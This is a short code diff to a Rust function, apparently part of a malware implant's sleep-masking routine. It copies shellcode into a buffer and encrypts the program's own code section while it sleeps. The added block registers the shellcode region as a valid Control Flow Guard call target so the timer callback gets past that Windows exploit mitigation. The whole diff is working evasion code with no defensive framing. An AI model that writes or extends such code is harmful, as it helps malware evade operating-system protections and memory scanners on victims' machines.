@@ -202,6 +202,15 @@ unsafe fn foliage(ms: u64) {
     ];
     std::ptr::copy_nonoverlapping(SC.as_ptr(), ctx.add(64), SC.len());
 
+    // Register shellcode as valid CFG indirect-call target so the timer queue
+    // callback survives Windows' Control Flow Guard check. No-op if CFG is off.
+    {
+        use windows_sys::Win32::System::Memory::{SetProcessValidCallTargets, CFG_CALL_TARGET_INFO};
+        use windows_sys::Win32::System::Threading::GetCurrentProcess;
+        let mut tgt = CFG_CALL_TARGET_INFO { Offset: 64, Flags: 1 }; // 1=CFG_CALL_TARGET_VALID
+        SetProcessValidCallTargets(GetCurrentProcess(), rgn, 256, 1, &mut tgt);
+    }
+
     // XOR-encrypt .text (runs from .text while still RWX — scope ends before PAGE_NOACCESS)
     {
         let s = std::slice::from_raw_parts_mut(text as *mut u8, text_size);
